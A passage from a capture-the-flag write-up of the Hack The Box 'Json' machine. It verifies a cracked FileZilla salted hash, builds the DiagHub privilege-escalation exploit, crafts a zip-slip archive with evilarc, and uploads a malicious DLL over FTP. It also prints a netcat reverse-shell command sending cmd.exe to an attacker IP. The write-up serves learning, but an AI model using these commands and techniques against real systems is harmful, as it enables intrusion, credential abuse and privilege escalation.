</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; tasklist | findstr chisel
chisel.exe                    <span style="color:#bd93f9">2508</span>                            <span style="color:#bd93f9">0</span>      6,764 K
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; taskkill /f /pid <span style="color:#bd93f9">2508</span>
SUCCESS: The process with PID <span style="color:#bd93f9">2508</span> has been terminated.
</code></pre></td></tr></table>
</div>
</div><h2 id="attempt-to-decrypt-password-from-filezilla-config-file">Attempt to decrypt password from FileZilla config file</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml
            &lt;Option <span style="color:#8be9fd;font-style:italic">Name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Pass&#34;</span>&gt;813CCFB086CB6C9046F13F1E10D5222ECB63E11A809C133580577B5597D28EB079F6DDD5AA52D1503BED569C72B589F165FC02993C51E0994A6290A0356EC2A0&lt;/Option&gt;
            &lt;Option <span style="color:#8be9fd;font-style:italic">Name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Salt&#34;</span>&gt;cwl.PD<span style="color:#ff79c6">(</span>Zw&amp;lt;EA-@&amp;gt;ux6z,<span style="color:#ff79c6">]</span>l5U7<span style="color:#ff79c6">]</span><span style="color:#8be9fd;font-style:italic">$Cr</span>@cW?aD4~:j4&amp;quot;%_*<span style="color:#f1fa8c">\6</span>k&amp;quot;Uk<span style="color:#ff79c6">{</span>1k@P7IX<span style="color:#f1fa8c">`</span>.K7v0&lt;/Option&gt;
</code></pre></td></tr></table>
</div>
</div><p>Usually we obtain the Password hash by concataining the password with the salt before hashing: <code>salt = hashfunction(pwd + salt)</code></p>
<p>We have to decode htmlentities (ie &lt; &hellip;) back in unicode character.
I used python but have suffer bug as it converted two character &lsquo;\6&rsquo; into a byte &lsquo;\x06&rsquo;, which affects the salt</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> html
html<span style="color:#ff79c6">.</span>unescape(<span style="color:#f1fa8c">&#39;cwl.PD(Zw&amp;lt;EA-@&amp;gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&amp;quot;%_*</span><span style="color:#f1fa8c">\6</span><span style="color:#f1fa8c">k&amp;quot;Uk{1k@P7IX`.K7v0&#39;</span>)
<span style="color:#f1fa8c">&#39;cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*</span><span style="color:#f1fa8c">\x06</span><span style="color:#f1fa8c">k&#34;Uk{1k@P7IX`.K7v0&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>We manually fix the salt so that it looks like</p>
<pre tabindex="0"><code>'cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\x06k&quot;Uk{1k@P7IX`.K7v0'
</code></pre><p>We can now calculate the password hash:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json$ <span style="color:#8be9fd;font-style:italic">echo</span> -n <span style="color:#f1fa8c">&#39;funnyhtbcwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*\6k&#34;Uk{1k@P7IX`.K7v0&#39;</span> |sha512sum
813ccfb086cb6c9046f13f1e10d5222ecb63e11a809c133580577b5597d28eb079f6ddd5aa52d1503bed569c72b589f165fc02993c51e0994a6290a0356ec2a0  -
</code></pre></td></tr></table>
</div>
</div><p>Which</p>
<h2 id="diaghub-exploit-attempt-to-elevate-privileges-by-using-login-and-password">DiagHub exploit: Attempt to elevate privileges by using login and password</h2>
<p>We first fail to get the Shell because superadmin ftp password &lsquo;funnyhtb&rsquo; is not the user account password</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">$pass</span> = <span style="color:#8be9fd;font-style:italic">convertto-securestring</span> <span style="color:#f1fa8c">&#39;funnyhtb&#39;</span> -asplain -force
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">$cred</span> = <span style="color:#8be9fd;font-style:italic">new-object</span> system.management.automation.pscredential(<span style="color:#f1fa8c">&#39;.\superadmin&#39;</span>, <span style="color:#8be9fd;font-style:italic">$pass</span>)
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">invoke-command</span> -computer json -credential <span style="color:#8be9fd;font-style:italic">$cred</span> -scriptblock {whoami}
<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; [json] Connecting to remote server json failed with the following error
message : Access is denied. <span style="color:#ff79c6">For</span> more information, see the
about_Remote_Troubleshooting Help topic.
    + CategoryInfo          : OpenError: (json:String) [], PSRemotingTransport
   Exception
    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken
</code></pre></td></tr></table>
</div>
</div><p>we will use the <a href="https://github.com/decoder-it/diaghub_exploit">Diaghub</a> technique to get a Shell.</p>
<ol>
<li>First we download the git project on CommandoVM, then open the solution in Visual Studio.</li>
<li>We edit FakeDll.cpp with a writeable path <code>C:\\tmp\\r.bat</code></li>
<li>We do the same in diaghub_exploit.cpp on top of LoadDll function</li>
<li>Change to Release</li>
<li>Build Solution</li>
<li><a href="https://stackoverflow.com/questions/42258311/cannot-open-include-file-ctype-h-no-such-file-or-directory">Troubleshoot</a>
<ol>
<li>Tools &gt; Tools and Features</li>
<li>Check &lsquo;Universal Windows Platform Development Tools&rsquo;</li>
<li>update the project properties for both FakeDll.cpp and diaghub_exploit.cpp
<ol>
<li>Windows SDK version = 10.0.18362.0</li>
<li>Platform Toolset = Visual Studio 2019 (v142)</li>
</ol>
</li>
<li>Rebuild</li>
</ol>
</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">ls </span>z:/json/diaghub

    Directory: z:\json\diaghub

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         2/19/2020  11:44 AM      91648 FakeDll.dll
-a---         2/19/2020  11:44 AM     141312 diaghub_exploit.exe

<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/json/diaghub/* .
<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/reverse.bat .
<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">type </span>reverse.bat
.\nc64.exe -e cmd.exe 10.10.14.70 8000
<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/nc64.exe .
</code></pre></td></tr></table>
</div>
</div><p><code>C:\windows\system32\</code> is not writeable by userpool, so we attempt <code>zipslip</code> by creating an evil zip with the tool <a href="https://github.com/ptoomey3/evilarc">evilarc on github</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">git clone https:<span style="color:#ff79c6">//</span>github<span style="color:#ff79c6">.</span>com<span style="color:#ff79c6">/</span>ptoomey3<span style="color:#ff79c6">/</span>evilarc
cd evilarc
python2 evilarc<span style="color:#ff79c6">.</span>py <span style="color:#ff79c6">-</span>p <span style="color:#f1fa8c">&#34;\windows\system32&#34;</span> <span style="color:#ff79c6">-</span>o win <span style="color:#ff79c6">-</span>f zipslip<span style="color:#ff79c6">.</span>zip <span style="color:#ff79c6">../</span>www<span style="color:#ff79c6">/</span>json<span style="color:#ff79c6">/</span>diaghub<span style="color:#ff79c6">/</span>FakeDll<span style="color:#ff79c6">.</span>dll
Creating zipslip<span style="color:#ff79c6">.</span>zip containing <span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\\windows\system32\FakeDll<span style="color:#ff79c6">.</span>dll
</code></pre></td></tr></table>
</div>
</div><p>Uploading the evil zip file</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json/diaghub$ ftp -p 10.10.10.158
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">220</span> Please visit https://filezilla-project.org/
Name <span style="color:#ff79c6">(</span>10.10.10.158:ctf<span style="color:#ff79c6">)</span>: qwerty
<span style="color:#bd93f9">331</span> Password required <span style="color:#ff79c6">for</span> qwerty
Password:
<span style="color:#bd93f9">230</span> Logged on
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,252,48<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> directory listing of <span style="color:#f1fa8c">&#34;/&#34;</span>
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> <span style="color:#8be9fd;font-style:italic">$Recycle</span>.Bin
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> Boot
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp         <span style="color:#bd93f9">404250</span> Nov <span style="color:#bd93f9">21</span>  <span style="color:#bd93f9">2014</span> bootmgr
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">1</span> Jun <span style="color:#bd93f9">18</span>  <span style="color:#bd93f9">2013</span> BOOTNXT
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp           <span style="color:#bd93f9">8192</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> BOOTSECT.BAK
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2013</span> Documents and Settings
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> inetpub
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp     <span style="color:#bd93f9">1744830464</span> Feb <span style="color:#bd93f9">19</span> 09:23 pagefile.sys
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp             <span style="color:#bd93f9">22</span> May <span style="color:#bd93f9">23</span>  <span style="color:#bd93f9">2019</span> password.txt
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2013</span> PerfLogs
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">08</span>  <span style="color:#bd93f9">2019</span> Program Files
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">08</span>  <span style="color:#bd93f9">2019</span> Program Files <span style="color:#ff79c6">(</span>x86<span style="color:#ff79c6">)</span>
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> ProgramData
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> Recovery
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> sources
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> System Volume Information
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Feb <span style="color:#bd93f9">19</span> 16:44 tmp
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> Users
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">08</span>  <span style="color:#bd93f9">2019</span> Windows
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/&#34;</span>
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Windows
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Windows&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> system32
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Windows/system32&#34;</span> is current directory.
ftp&gt; !ls
FakeDll.dll  diaghub_exploit.exe  zipslip.zip
ftp&gt; put FakeDll.dll
local: FakeDll.dll remote: FakeDll.dll
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,205,252<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> file upload to server of <span style="color:#f1fa8c">&#34;/Windows/system32/FakeDll.dll&#34;</span>
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Windows/system32/FakeDll.dll&#34;</span>
<span style="color:#bd93f9">91876</span> bytes sent in 0.01 secs <span style="color:#ff79c6">(</span>6.7744 MB/s<span style="color:#ff79c6">)</span>
ftp&gt;
ftp&gt; bye
</code></pre></td></tr></table>
</div>
</div><p>Unfortunately while we can see the FakeDll.dll from the Ftp server, we cannot see it from &lsquo;userpool&rsquo; shell :(</p>

      </div>
    </article>

    <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%20-%20Json&amp;caption=HTB%20-%20Json&amp;canonicalUrl=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


